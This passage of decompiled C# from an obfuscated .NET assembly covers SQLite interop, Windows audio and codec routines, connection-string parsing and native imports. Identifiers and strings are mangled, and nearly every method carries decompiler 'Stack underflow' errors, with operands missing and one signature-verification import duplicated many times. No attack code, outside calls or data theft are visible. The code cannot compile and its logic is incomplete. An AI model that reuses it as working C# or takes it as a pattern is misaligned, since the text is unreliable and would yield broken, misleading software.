			double num3 = /*Error near IL_0019: Stack underflow*// num2;
			if (num3 < 0.0)
			{
				num3 = 0.0;
			}
			return num3;
		}

		static void _0001(bool _0002, global::_0003._0013 _0003, global::_0017._0080 P_2)
		{
			//IL_0096: Incompatible stack heights: 0 vs 1
			//IL_00a6: Incompatible stack heights: 0 vs 1
			_0018._0001((global::_0017._0080)/*Error near IL_00a0: Stack underflow*/);
			if (((global::_0017._0080)/*Error near IL_0014: Stack underflow*/)._0001 == null)
			{
				throw new InvalidOperationException(_0018._0001((IFormatProvider)_008F_0003._008C_0007(), _0080._0014._0001(107377465), new object[1] { _0002 ? _0080._0014._0001(107352106) : _0080._0014._0001(107352151) }));
			}
			if (_0003 == global::_0003._0013._0006 && (P_2._0003 & SQLiteConnectionFlags.NoLoadExtension) == SQLiteConnectionFlags.NoLoadExtension)
			{
				throw new SQLiteException(_0080._0014._0001(107358644));
			}
			P_2._0001._0001(_0003, _0002);
		}

		static void _0001(global::_0004._0001 P_0)
		{
			//IL_00aa: Incompatible stack heights: 0 vs 1
			//IL_00b4: Incompatible stack heights: 0 vs 3
			//IL_00be: Incompatible stack heights: 0 vs 3
			try
			{
				_000E_0005._0094_000E(global::_0015._0001._0016);
				if (((Array)/*Error near IL_0012: Stack underflow*/).Length == 0)
				{
					_ = global::_001C._0097_0003;
					_ = global::_0011._008E_0002;
					_0018._0001();
					_ = global::_0015._0001._0016;
					_ = global::_000E._008A_0002;
					_0080._0014._0001(107362099);
					char[] obj = new char[1] { '!' };
					string obj2 = /*Error near IL_0047: Stack underflow*/((object)/*Error near IL_0047: Stack underflow*/, obj)[0];
					string text = /*Error near IL_004e: Stack underflow*/((string)/*Error near IL_004e: Stack underflow*/, (string)/*Error near IL_004e: Stack underflow*/, obj2);
					if (/*Error near IL_0053: Stack underflow*/(text))
					{
						_0018._0001(P_0, global::_0011._008E_0002(_0018._0001(), global::_0015._0001._0016, global::_0002._007E_0006(global::_000E._008A_0002(_0080._0014._0001(107362099), new char[1] { '!' })[0])));
					}
				}
			}
			catch
			{
			}
		}

		static double _0001(float _0002, global::_000E._0019._0001 P_1)
		{
			//IL_0005: Incompatible stack heights: 0 vs 1
			return (double)/*Error near IL_0003: Stack underflow*/;
		}

		static void _0001(global::_0017._0080 _0002, string _0003, object P_2)
		{
			//IL_001e: Incompatible stack heights: 0 vs 1
			//IL_0021: Incompatible stack heights: 0 vs 1
			//IL_0024: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ != 0 && ((global::_0017._0080)/*Error near IL_000b: Stack underflow*/)._0001 != null)
			{
				((global::_0017._0080)/*Error near IL_0015: Stack underflow*/)._0001[_0003] = P_2;
			}
		}

		static string _0001(AsioError _0002)
		{
			//IL_0020: Incompatible stack heights: 0 vs 2
			//IL_0023: Incompatible stack heights: 0 vs 1
			//IL_002a: Incompatible stack heights: 0 vs 1
			_ = _0006_0006._0099_000F;
			_0091._0080_0004(typeof(AsioError).TypeHandle);
			object obj = (AsioError)/*Error near IL_0018: Stack underflow*/;
			/*Error near IL_002a: Stack underflow*/((Type)/*Error near IL_002a: Stack underflow*/, obj);
			return (string)/*Error near IL_001b: Stack underflow*/;
		}

		static int _0001(global::_0017._0015 P_0)
		{
			//IL_0017: Incompatible stack heights: 0 vs 1
			//IL_001a: Incompatible stack heights: 0 vs 2
			//IL_0021: Incompatible stack heights: 0 vs 1
			_ = ((global::_0017._0015)/*Error near IL_0007: Stack underflow*/)._0001._0001;
			IntPtr pUnknown = ((global::_0017._0015)/*Error near IL_0013: Stack underflow*/)._0001;
			/*Error near IL_0021: Stack underflow*/(pUnknown);
			return (int)/*Error near IL_0016: Stack underflow*/;
		}

		static long _0001(DateTime _0002)
		{
			//IL_0015: Unknown result type (might be due to invalid IL or missing references)
			//IL_0017: Expected I8, but got Unknown
			//IL_001c: Incompatible stack heights: 0 vs 1
			//IL_0026: Incompatible stack heights: 0 vs 1
			_0002.Subtract(global::_0001._001A._0001);
			_ = ((TimeSpan)/*Error near IL_000b: Stack underflow*/).Ticks;
			return /*Error near IL_0016: Stack underflow*// 10000000;
		}

		static void _0001(global::_0007._0014 P_0)
		{
			//IL_000c: Incompatible stack heights: 0 vs 1
			//IL_0013: Incompatible stack heights: 0 vs 1
			((global::_0007._0014)/*Error near IL_0007: Stack underflow*/)._0001._0001();
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static void _0001(global::_0013._0017 _0002, string P_1)
		{
			//IL_011b: Incompatible stack heights: 0 vs 2
			//IL_0125: Incompatible stack heights: 0 vs 1
			//IL_012f: Incompatible stack heights: 0 vs 1
			_ = _0004_0007._007E_0098_0010;
			_0080._0014._0001(107376836);
			/*Error near IL_012f: Stack underflow*/((object)/*Error near IL_012f: Stack underflow*/, (string)/*Error near IL_012f: Stack underflow*/, 0, StringComparison.OrdinalIgnoreCase);
			int num = (int)/*Error near IL_001c: Stack underflow*/;
			if (num == -1)
			{
				throw new ArgumentOutOfRangeException();
			}
			string[] array = global::_000E._007E_008A_0002(global::_0003._007E_0080(global::_0003._007E_0080(global::_0003._007E_0080(global::_0003._007E_0080(global::_0003._007E_0080(global::_0003._007E_0080(_009E_0003._007E_009E_0007(P_1, num + 6), _0080._0014._0001(107411652), string.Empty), _0080._0014._0001(107354595), string.Empty), _0080._0014._0001(107376859), string.Empty), _0080._0014._0001(107401852), string.Empty), _0080._0014._0001(107401847), string.Empty), _0080._0014._0001(107376854), string.Empty), new char[4] { ',', '\r', '\n', '\t' });
			for (int i = 0; i < array.Length; i++)
			{
				if (global::_001C._0096_0003(array[i]))
				{
					array[i] = null;
				}
			}
			_0002._0002 = array;
		}

		static void _0001(_0004 P_0)
		{
			//IL_0025: Incompatible stack heights: 0 vs 1
			//IL_0028: Incompatible stack heights: 0 vs 1
			//IL_002b: Incompatible stack heights: 0 vs 1
			((_0004)/*Error near IL_0008: Stack underflow*/)._0002 = 0;
			((_0004)/*Error near IL_0010: Stack underflow*/)._0003 = 0;
			((_0004)/*Error near IL_0018: Stack underflow*/)._0004 = 0;
			_0018._0001(P_0._0001);
		}

		static void _0001(global::_0003._0011 _0002, _001B._0014 P_1)
		{
			//IL_002f: Incompatible stack heights: 0 vs 1
			//IL_0032: Incompatible stack heights: 0 vs 2
			//IL_0035: Incompatible stack heights: 0 vs 2
			if (((_001B._0014)/*Error near IL_0007: Stack underflow*/)._0001 != null)
			{
				_ = global::_0007._0097;
				_ = ((_001B._0014)/*Error near IL_0015: Stack underflow*/)._0001;
				_001B._0015 obj = ((_001B._0014)/*Error near IL_001c: Stack underflow*/)._0001;
				int num = ((global::_0018._0017)/*Error near IL_0021: Stack underflow*/)._0002((global::_000F._0010)obj);
				/*Error near IL_0026: Stack underflow*/(num);
				P_1._0001 = null;
			}
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_config")]
		static extern _0080._0017 _0001(global::_0016._001B _0002, int _0003);

		static bool _0001(Assembly _0002, ref string _0003)
		{
			//IL_00aa: Incompatible stack heights: 0 vs 1
			//IL_00b7: Incompatible stack heights: 0 vs 2
			try
			{
				if ((int)/*Error near IL_0007: Stack underflow*/ == 0)
				{
					return false;
				}
				_ = global::_0002._007E_0002;
				string text = /*Error near IL_0021: Stack underflow*/((object)/*Error near IL_0021: Stack underflow*/);
				if (global::_001C._0096_0003(text))
				{
					return false;
				}
				Uri uri = new Uri(text);
				string text2 = global::_0002._007E_0003(uri);
				if (!global::_001C._0097_0003(text2))
				{
					return false;
				}
				string text3 = global::_001E._0099_0003(text2);
				string text4 = _0018._0001(text3, global::_0017._0084._0004);
				if (global::_001C._0097_0003(text4))
				{
					_0003 = text2;
					return true;
				}
				List<string> list = null;
				if (global::_0017._0084._0001(text3, ref list) > 0)
				{
					_0003 = text2;
					return true;
				}
				return false;
			}
			catch (Exception ex)
			{
				try
				{
					_0015_0004._001E_0008(_0018._0001((IFormatProvider)_008F_0003._008C_0007(), _0080._0014._0001(107376849), new object[1] { ex }));
				}
				catch
				{
				}
			}
			return false;
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static string[] _0001(global::_0004._0001 P_0)
		{
			//IL_0044: Incompatible stack heights: 0 vs 3
			//IL_004b: Incompatible stack heights: 0 vs 1
			//IL_0052: Incompatible stack heights: 0 vs 1
			_ = global::_0002._007E_0006;
			_ = _0084_0002._007E_008D_0005;
			_0082_0002._0088_0005();
			byte[] array = global::_0015._0001._0001;
			IntPtr intPtr = (nint)global::_0015._0001._0001.LongLength;
			/*Error near IL_004b: Stack underflow*/((object)/*Error near IL_004b: Stack underflow*/, array, 0, (int)(nint)intPtr);
			/*Error near IL_0052: Stack underflow*/((object)/*Error near IL_0052: Stack underflow*/);
			string text = (string)/*Error near IL_0024: Stack underflow*/;
			return global::_000E._007E_008A_0002(text, new char[1] { '?' });
		}

		static void _0001(global::_0017._007F._0003 _0002, int _0003, int _0004, int P_3)
		{
			//IL_0050: Incompatible stack heights: 0 vs 1
			//IL_0053: Incompatible stack heights: 0 vs 2
			//IL_0056: Incompatible stack heights: 0 vs 1
			while (_0004-- > 0)
			{
				_ = ((global::_0017._007F._0003)/*Error near IL_0009: Stack underflow*/)._0001;
				int num = ((global::_0017._007F._0003)/*Error near IL_0012: Stack underflow*/)._0003;
				((global::_0017._007F._0003)/*Error near IL_001b: Stack underflow*/)._0003 = num + 1;
				byte num2 = _0002._0001[_0003++];
				((sbyte[])/*Error near IL_002a: Stack underflow*/)[num] = (sbyte)num2;
				_0002._0003 &= 32767;
				_0003 &= 0x7FFF;
			}
		}

		static bool _0001(object _0002, _0019._007F _0003)
		{
			//IL_0042: Incompatible stack heights: 0 vs 2
			//IL_0049: Incompatible stack heights: 0 vs 1
			//IL_004c: Incompatible stack heights: 0 vs 1
			_ = global::_0012._0014._0001;
			((IDictionary<_0019._007F, object>)/*Error near IL_0049: Stack underflow*/).TryGetValue((_0019._007F)/*Error near IL_0049: Stack underflow*/, out object _);
			if ((int)/*Error near IL_000d: Stack underflow*/ != 0)
			{
				if (/*Error near IL_0010: Stack underflow*/ is IDisposable disposable)
				{
					global::_0008._007E_0098(disposable);
					IDisposable disposable2 = null;
				}
				global::_0012._0014._0001[_0003] = _0002;
				return true;
			}
			global::_0012._0014._0001.Add(_0003, _0002);
			return false;
		}

		static void _0001(global::_0017._001B P_0)
		{
			//IL_0059: Incompatible stack heights: 0 vs 1
			//IL_0063: Incompatible stack heights: 0 vs 1
			_0018._0001((global::_0017._001B)/*Error near IL_0060: Stack underflow*/);
			if (((global::_0017._001B)/*Error near IL_000b: Stack underflow*/)._0001 != null)
			{
				global::_0007._0097(P_0._0001._0001(out var obj));
				P_0._0001 = new global::_0005._0015(obj);
				P_0._0001 = new global::_0010._0016(P_0);
				global::_0007._0097(P_0._0001._0001(P_0._0001));
			}
		}

		static bool _0001(byte[] _0002)
		{
			//IL_001d: Incompatible stack heights: 0 vs 1
			byte[] array = (byte[])/*Error near IL_0020: Stack underflow*/;
			for (int i = 0; i < array.Length; i++)
			{
				if (array[i] != 0)
				{
					return false;
				}
			}
			return true;
		}

		static global::_000E._0014 _0001(int _0002)
		{
			//IL_003d: Incompatible stack heights: 0 vs 2
			//IL_0044: Incompatible stack heights: 0 vs 1
			global::_000E._0014 result = default(global::_000E._0014);
			_ = _0098._0089_0004;
			object obj = (global::_000E._0014)/*Error near IL_0014: Stack underflow*/;
			/*Error near IL_0044: Stack underflow*/(obj);
			int num = (int)/*Error near IL_0047: Stack underflow*/;
			_0018._0001(_0018._0001(_0099._008E_0004(_0002), out result, num), _0080._0014._0001(107376728));
			return result;
		}

		static bool _0001(string _0002)
		{
			//IL_0003: Invalid comparison between Unknown and O
			//IL_0007: Incompatible stack heights: 0 vs 1
			return (object)/*Error near IL_0005: Stack underflow*/ == null;
		}

		static void _0001(ref int _0002, ref Dictionary<string, int> _0003, ref int _0004, string _0005, ref int _0006)
		{
			//IL_0101: Incompatible stack heights: 0 vs 1
			//IL_010d: Incompatible stack heights: 0 vs 1
			_0018._0001();
			global::_0007._001B obj = (global::_0007._001B)/*Error near IL_0107: Stack underflow*/;
			if ((int)/*Error near IL_0011: Stack underflow*/ != 0)
			{
				obj._0001(_0005, ref _0003, ref _0002, ref _0004, ref _0006);
				return;
			}
			lock (global::_0007._001C._0001)
			{
				_0002 = global::_0007._001C._0002;
				_0004 = global::_0007._001C._0003;
				if (_0003 == null)
				{
					_0003 = new Dictionary<string, int>(StringComparer.OrdinalIgnoreCase);
				}
				if (_0005 != null)
				{
					if (global::_0007._001C._0001.TryGetValue(_0005, out var value))
					{
						int num = value._0001?.Count ?? 0;
						_0003.Add(_0005, num);
						_0006 += num;
					}
					return;
				}
				foreach (KeyValuePair<string, global::_0007._001C._0001> item in global::_0007._001C._0001)
				{
					if (item.Value != null)
					{
						int num2 = item.Value._0001?.Count ?? 0;
						_0003.Add(item.Key, num2);
						_0006 += num2;
					}
				}
			}
		}

		static bool _0001()
		{
			//IL_0054: Incompatible stack heights: 0 vs 1
			//IL_0065: Incompatible stack heights: 0 vs 2
			_ = _0091_0002._009C_0005;
			object obj = global::_0002._0019._0001;
			/*Error near IL_006c: Stack underflow*/((object)/*Error near IL_006c: Stack underflow*/);
			try
			{
				_ = global::_0002._0019._0004.HasValue;
				if ((int)/*Error near IL_0018: Stack underflow*/ == 0)
				{
					if (_0018._0001(_0080._0014._0001(107376703), (string)null) != null)
					{
						global::_0002._0019._0004 = true;
					}
					else
					{
						global::_0002._0019._0004 = false;
					}
				}
				return global::_0002._0019._0004.Value;
			}
			finally
			{
				_0091_0002._009D_0005(obj);
			}
		}

		static IList<global::_0013._0010> _0001(int _0002, global::_0016._0014 P_1)
		{
			//IL_000d: Incompatible stack heights: 0 vs 1
			//IL_0010: Incompatible stack heights: 0 vs 2
			//IL_0017: Incompatible stack heights: 0 vs 1
			_ = ((global::_0016._0014)/*Error near IL_0007: Stack underflow*/)._0001;
			_ = ((List<IList<global::_0013._0010>>)/*Error near IL_0017: Stack underflow*/)[(int)/*Error near IL_0017: Stack underflow*/];
			return (IList<global::_0013._0010>)/*Error near IL_000c: Stack underflow*/;
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static void _0001(_0019._0010 P_0)
		{
			//IL_001a: Incompatible stack heights: 0 vs 1
			//IL_001d: Incompatible stack heights: 0 vs 1
			//IL_0020: Incompatible stack heights: 0 vs 1
			((_0019._0010)/*Error near IL_0008: Stack underflow*/)._0003 = 0;
			((_0019._0010)/*Error near IL_0010: Stack underflow*/)._0002 = 0;
			((_0019._0010)/*Error near IL_0018: Stack underflow*/)._0001 = 0;
		}

		static void _0001(_0014 P_0)
		{
			//IL_000a: Incompatible stack heights: 0 vs 1
			((_0014)/*Error near IL_0008: Stack underflow*/)._0006 = 0;
		}

		static int _0001(int _0002, global::_0006._0010 P_1)
		{
			//IL_0029: Incompatible stack heights: 0 vs 1
			//IL_002c: Incompatible stack heights: 0 vs 1
			//IL_002f: Incompatible stack heights: 0 vs 2
			if ((int)/*Error near IL_0004: Stack underflow*/ == 0)
			{
				return 0;
			}
			_ = ((global::_0006._0010)/*Error near IL_000d: Stack underflow*/)._0001;
			_0018._0001(_0018._0001((IntPtr)/*Error near IL_0017: Stack underflow*/, (int)/*Error near IL_0017: Stack underflow*/, out int result, _0080._0008._0001), _0080._0014._0001(107351431));
			return result;
		}

		static long _0001(long _0002, global::_0007._0006 P_1)
		{
			//IL_000a: Unknown result type (might be due to invalid IL or missing references)
			//IL_0013: Unknown result type (might be due to invalid IL or missing references)
			//IL_0015: Expected I8, but got Unknown
			//IL_0016: Incompatible stack heights: 0 vs 1
			//IL_0019: Incompatible stack heights: 0 vs 1
			//IL_001c: Incompatible stack heights: 0 vs 2
			int num = ((global::_0007._0006)/*Error near IL_0009: Stack underflow*/)._0001;
			_ = /*Error near IL_000b: Stack underflow*// num;
			int num2 = ((global::_0007._0006)/*Error near IL_0012: Stack underflow*/)._0002;
			return /*Error near IL_0014: Stack underflow*/* num2;
		}

		static void _0001(global::_0017._0080 P_0)
		{
			//IL_004a: Incompatible stack heights: 0 vs 1
			//IL_0054: Incompatible stack heights: 0 vs 1
			_0018._0001((global::_0017._0080)/*Error near IL_0051: Stack underflow*/);
			if (((global::_0017._0080)/*Error near IL_000b: Stack underflow*/)._0001 == null)
			{
				throw new InvalidOperationException(_0080._0014._0001(107376670));
			}
			_0080._0017 obj = P_0._0001._0001();
			if (obj != 0)
			{
				throw new SQLiteException(obj, P_0._0001._0002(_0080._0014._0001(107377113)));
			}
		}

		static void _0001(byte[] _0002, int _0003, global::_0004._0005 P_2)
		{
			//IL_001d: Incompatible stack heights: 0 vs 2
			//IL_0020: Incompatible stack heights: 0 vs 2
			//IL_0023: Incompatible stack heights: 0 vs 1
			_ = _0011_0003._008D_0006;
			_ = ((global::_0004._0005)/*Error near IL_000c: Stack underflow*/)._0001;
			int num = P_2._0001;
			/*Error near IL_001b: Stack underflow*/((IntPtr)/*Error near IL_001b: Stack underflow*/, (byte[])/*Error near IL_001b: Stack underflow*/, (int)/*Error near IL_001b: Stack underflow*/, num);
		}

		[DllImport("winmm.dll", EntryPoint = "waveOutGetPosition")]
		static extern MmResult _0001(IntPtr _0002, out global::_0012._0001 _0003, int _0004);

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static bool _0001(_001F._0019 _0002, int P_1)
		{
			//IL_009b: Incompatible stack heights: 0 vs 1
			//IL_00a1: Incompatible stack heights: 0 vs 2
			//IL_00a7: Incompatible stack heights: 0 vs 1
			_ = ((_001F._0019)/*Error near IL_000a: Stack underflow*/)._0001;
			if (((_001F._0019._0001[])/*Error near IL_0010: Stack underflow*/)[/*Error near IL_0010: Stack underflow*/]._0003 == -1)
			{
				return true;
			}
			_0018._0001((_001F._0019)/*Error near IL_0029: Stack underflow*/, P_1);
			if (_0002._0001[P_1]._0001 != null)
			{
				return _0008_0005._007E_0091_000E(_0002._0001[P_1]._0001._0001, _0002._0001[P_1]._0004);
			}
			return _0002._0001._0001._0002(_0002._0001, _0002._0001[P_1]._0003) == 0;
		}

		static string _0001()
		{
			//IL_0021: Incompatible stack heights: 0 vs 2
			//IL_0028: Incompatible stack heights: 0 vs 1
			_ = global::_000F._008B_0002;
			_0086_0005._0015_000F(Environment.SpecialFolder.CommonApplicationData);
			string text = global::_0015._0001._0019;
			/*Error near IL_0028: Stack underflow*/((string)/*Error near IL_0028: Stack underflow*/, text);
			return (string)/*Error near IL_001a: Stack underflow*/;
		}

		[DllImport("Msacm32.dll", EntryPoint = "acmFormatSuggest")]
		static extern MmResult _0001(IntPtr _0002, IntPtr _0003, IntPtr _0004, int _0005, global::_0005._000F _0006);

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_column_bytes16")]
		static extern int _0001(IntPtr _0002, int _0003);

		static void _0001(global::_000E._0008 P_0)
		{
			//IL_0059: Incompatible stack heights: 0 vs 1
			//IL_005f: Incompatible stack heights: 0 vs 2
			object obj = ((global::_000E._0008)/*Error near IL_0007: Stack underflow*/)._0001;
			_ = _0091_0002._009C_0005;
			/*Error near IL_0015: Stack underflow*/((object)/*Error near IL_0015: Stack underflow*/);
			try
			{
				if (P_0._0002 != null)
				{
					P_0._0002._0002();
					P_0._0002 = null;
				}
				if (P_0._0001 != null)
				{
					P_0._0001._0002();
					P_0._0001 = null;
				}
			}
			finally
			{
				_0091_0002._009D_0005(obj);
			}
		}

		static void _0001(int _0002, int _0003, int _0004)
		{
			//IL_0007: Invalid comparison between Unknown and I4
			//IL_004d: Incompatible stack heights: 0 vs 1
			//IL_0057: Incompatible stack heights: 0 vs 1
			_0018._0001((int)/*Error near IL_0054: Stack underflow*/);
			if ((int)/*Error near IL_0009: Stack underflow*/ < 0 || _0003 > 127)
			{
				throw new ArgumentOutOfRangeException(_0080._0014._0001(107377032), _0080._0014._0001(107382804));
			}
			if (_0004 < 0 || _0004 > 127)
			{
				throw new ArgumentOutOfRangeException(_0080._0014._0001(107377055), _0080._0014._0001(107383263));
			}
		}

		static byte _0001(short _0002)
		{
			//IL_0002: Unknown result type (might be due to invalid IL or missing references)
			//IL_0004: Unknown result type (might be due to invalid IL or missing references)
			//IL_000a: Unknown result type (might be due to invalid IL or missing references)
			//IL_0060: Incompatible stack heights: 0 vs 1
			//IL_0063: Expected I4, but got Unknown
			//IL_0066: Incompatible stack heights: 0 vs 1
			int num = (~/*Error near IL_0003: Stack underflow*/ >> 8) & 0x80;
			if ((int)/*Error near IL_0011: Stack underflow*/ == 0)
			{
				_0002 = (short)(-_0002);
			}
			if (_0002 > 32635)
			{
				_0002 = 32635;
			}
			byte b;
			if (_0002 >= 256)
			{
				int num2 = global::_0004._0014._0001[(_0002 >> 8) & 0x7F];
				int num3 = (_0002 >> num2 + 3) & 0xF;
				b = (byte)((num2 << 4) | num3);
			}
			else
			{
				b = (byte)(_0002 >> 4);
			}
			return (byte)(b ^ (byte)((uint)num ^ 0x55u));
		}

		static void _0001(float[] _0002, int _0003, global::_000E._0019 _0004, float[] _0005, int _0006, float[] _0007, int _0008, int _000E, double P_8)
		{
			//IL_0016: Unknown result type (might be due to invalid IL or missing references)
			//IL_0019: Expected F8, but got Unknown
			//IL_009b: Incompatible stack heights: 0 vs 1
			//IL_00a8: Incompatible stack heights: 0 vs 1
			int num = ((global::_000E._0019)/*Error near IL_000a: Stack underflow*/)._0007;
			P_8 = /*Error near IL_0017: Stack underflow*/* (double)num;
			int num2 = (int)P_8;
			_0003 += num - 1 - num2;
			P_8 -= (double)num2;
			double num3 = 0.0;
			double num4 = 0.0;
			int num5 = _0003;
			int num6 = _000E;
			int num7 = _0008;
			while (num7-- != 0)
			{
				num3 += (double)(_0007[num5] * _0002[num6]);
				num4 += (double)(_0007[num5 + 1] * _0002[num6]);
				num6++;
				num5 += num;
			}
			_0005[_0006] = (float)(num3 * P_8 + num4 * (1.0 - P_8));
		}

		static SortedList<string, string> _0001(string _0002, bool _0003, global::_0017._0080 _0004)
		{
			//IL_014c: Incompatible stack heights: 0 vs 1
			//IL_015c: Incompatible stack heights: 0 vs 1
			string text = (string)/*Error near IL_0152: Stack underflow*/;
			_ = StringComparer.OrdinalIgnoreCase;
			SortedList<string, string> sortedList = new SortedList<string, string>((IComparer<string>?)/*Error near IL_0014: Stack underflow*/);
			string text2 = null;
			string[] array = ((!_0018._0001(_0004)) ? _0018._0001(text, ';', _0004: true, ref text2) : _0018._0001(text, ';'));
			if (array == null)
			{
				throw new ArgumentException(_0018._0001((IFormatProvider)CultureInfo.CurrentCulture, _0080._0014._0001(107377046), new object[1] { (text2 != null) ? text2 : _0080._0014._0001(107376977) }));
			}
			int num = ((array != null) ? array.Length : 0);
			for (int i = 0; i < num; i++)
			{
				if (array[i] == null)
				{
					continue;
				}
				array[i] = array[i].Trim();
				if (array[i].Length == 0)
				{
					continue;
				}
				int num2 = array[i].IndexOf('=');
				if (num2 != -1)
				{
					sortedList.Add(_0018._0001(array[i].Substring(0, num2).Trim()), _0018._0001(array[i].Substring(num2 + 1).Trim()));
					continue;
				}
				if (_0003)
				{
					sortedList.Add(_0018._0001(array[i].Trim()), string.Empty);
					continue;
				}
				throw new ArgumentException(_0018._0001((IFormatProvider)CultureInfo.CurrentCulture, _0080._0014._0001(107376364), new object[1] { array[i] }));
			}
			return sortedList;
		}

		[DllImport("kernel32.dll", EntryPoint = "LoadLibrary")]
		static extern IntPtr _0001(string _0002);

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static bool _0001(bool _0002, global::_0001._0081 _0003, bool _0004, global::_0001._0082 _0005, string _0006)
		{
			//IL_002c: Incompatible stack heights: 0 vs 1
			//IL_002f: Incompatible stack heights: 0 vs 1
			//IL_0036: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ == 0)
			{
				return false;
			}
			_ = ((global::_0001._0081)/*Error near IL_0036: Stack underflow*/).NativeHandle;
			IntPtr intPtr = (IntPtr)/*Error near IL_000b: Stack underflow*/;
			if (_0090_0002._009A_0005(intPtr, IntPtr.Zero))
			{
				return false;
			}
			return _0018._0001(_0005, intPtr, _0004, _0002, _0006);
		}

		[DllImport("winmm.dll", EntryPoint = "midiOutCacheDrumPatches")]
		static extern MmResult _0001(IntPtr _0002, int _0003, IntPtr _0004, int _0005);

		static void _0001(string _0002, _007F._0008 P_1)
		{
			//IL_00cb: Incompatible stack heights: 0 vs 2
			//IL_00d5: Incompatible stack heights: 0 vs 1
			//IL_00df: Incompatible stack heights: 0 vs 1
			_ = _0012_0004._007E_001A_0008;
			_0080._0014._0001(107376271);
			/*Error near IL_00df: Stack underflow*/((object)/*Error near IL_00df: Stack underflow*/, (string)/*Error near IL_00df: Stack underflow*/, StringComparison.OrdinalIgnoreCase);
			if ((int)/*Error near IL_001c: Stack underflow*/ != 0)
			{
				P_1._0001 = new _001C._0007(_0002);
				if (P_1._0001.WaveFormat._0001 != WaveFormatEncoding.Pcm && P_1._0001.WaveFormat._0001 != WaveFormatEncoding.IeeeFloat)
				{
					P_1._0001 = _0018._0001(P_1._0001);
					P_1._0001 = new global::_0012._0003(P_1._0001);
				}
			}
			else if (_0012_0004._007E_001A_0008(_0002, _0080._0014._0001(107376262), StringComparison.OrdinalIgnoreCase))
			{
				P_1._0001 = new global::_0012._0005(_0002);
			}
			else if (global::_0004._007E_0081(_0002, _0080._0014._0001(107376285)))
			{
				P_1._0001 = new global::_0005._0006(_0002);
			}
			else
			{
				P_1._0001 = new global::_0015._0008(_0002);
			}
		}

		[DllImport("mfplat.dll", EntryPoint = "MFInitMediaTypeFromWaveFormatEx", ExactSpelling = true, PreserveSig = false)]
		static extern void _0001([In] _0019._0012 _0002, [In] global::_0005._0005 _0003, [In] int _0004);

		static void _0001(int _0002, global::_0014._0001 P_1)
		{
			//IL_0012: Unknown result type (might be due to invalid IL or missing references)
			//IL_0018: Unknown result type (might be due to invalid IL or missing references)
			//IL_001e: Unknown result type (might be due to invalid IL or missing references)
			//IL_0024: Expected F4, but got Unknown
			//IL_0026: Incompatible stack heights: 0 vs 1
			//IL_0029: Incompatible stack heights: 0 vs 1
			//IL_002c: Incompatible stack heights: 0 vs 3
			_ = (float)/*Error near IL_0005: Stack underflow*/;
			_ = global::_001A._0012_0003;
			int num = /*Error near IL_0011: Stack underflow*/((object)/*Error near IL_0011: Stack underflow*/);
			_003F val = /*Error near IL_0013: Stack underflow*// (float)num;
			((global::_0014._0001)/*Error near IL_0024: Stack underflow*/).Pan = val * 2f - 1f;
		}

		static bool _0001(global::_0013._0010 _0002)
		{
			//IL_0020: Incompatible stack heights: 0 vs 1
			//IL_0023: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ != 0)
			{
				global::_0014._0011 obj = /*Error near IL_0007: Stack underflow*/as global::_0014._0011;
				global::_0014._0011 obj2 = default(global::_0014._0011);
				if (0 == 0)
				{
					obj2 = obj;
				}
				if (obj2 != null)
				{
					return obj2._0001 == MetaEventType.EndTrack;
				}
			}
			return false;
		}

		[DllImport("winmm.dll", CharSet = CharSet.Ansi, EntryPoint = "mixerGetLineInfo")]
		static extern MmResult _0001(IntPtr _0002, ref global::_0015._0003._0005 _0003, _001D._0001 _0004);

		static Guid _0001(int _0002, _001F._0019 P_1)
		{
			//IL_0052: Incompatible stack heights: 0 vs 1
			//IL_0055: Incompatible stack heights: 0 vs 1
			_0018._0001((_001F._0019)/*Error near IL_005c: Stack underflow*/, (int)/*Error near IL_005c: Stack underflow*/);
			if (P_1._0001[_0002]._0001 != null)
			{
				return _0005_0007._007E_0099_0010(P_1._0001[_0002]._0001._0001, P_1._0001[_0002]._0004);
			}
			throw new InvalidCastException();
		}

		static string _0001(global::_000E._001F _0002, IntPtr _0003)
		{
			//IL_008e: Incompatible stack heights: 0 vs 1
			//IL_0094: Incompatible stack heights: 0 vs 2
